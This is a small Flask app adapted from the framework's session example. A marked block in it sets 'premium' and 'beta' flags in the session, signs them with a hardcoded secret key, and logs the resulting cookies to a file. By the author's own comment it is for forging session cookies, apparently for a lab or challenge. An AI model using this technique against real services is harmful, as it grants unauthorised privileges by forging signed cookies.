from flask import Flask, request, redirect, url_for, session
app = Flask(__name__)
# Set the secret key to some random bytes. Keep this really secret!
app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'


@app.route('/')
def index():
    # My integration of code to forge session cookie
    ########################################################
    session['premium'] = 'true'
    session['beta'] = 'true'
    my_cookie = str(request.cookies)
    # writing session cookie to a text file
    with open("cookies.txt", "a") as f:
        if my_cookie.startswith("ImmutableMultiDict([('session', '") and my_cookie.endswith("')])"):
            cleaned_cookie = my_cookie[len("ImmutableMultiDict([('session', '"):-len("')])")]
            f.write(cleaned_cookie + "\n")
    ###############################################################
    if 'username' in session:
        return f'Logged in as {session["username"]}\n {request.cookies}'

    return f'You are not logged in \n\n {request.cookies}'


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # session['username'] = request.form['username']
        # {"premium":true,"beta":true}
        return redirect(url_for('index'))
    return '''
        <form method="post">
            <p><input type=text name=username>
            <p><input type=submit value=Login>
        </form>
    '''


@app.route('/logout')
def logout():
    # remove the username from the session if it's there
    session.pop('username', None)
    return redirect(url_for('index'))

